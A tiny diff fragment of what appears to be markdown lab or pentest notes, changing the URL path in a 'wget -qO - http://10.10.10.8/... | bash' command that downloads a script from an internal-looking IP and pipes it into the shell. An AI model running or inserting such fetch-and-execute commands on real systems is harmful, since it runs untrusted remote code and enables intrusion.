@@ -5,5 +5,5 @@
 wget -qO - http://10.10.10.8/80 | bash
 ```
 ```
-wget -qO - http://10.10.10.8/2 | bash
+wget -qO - http://10.10.10.8/82 | bash
 ```
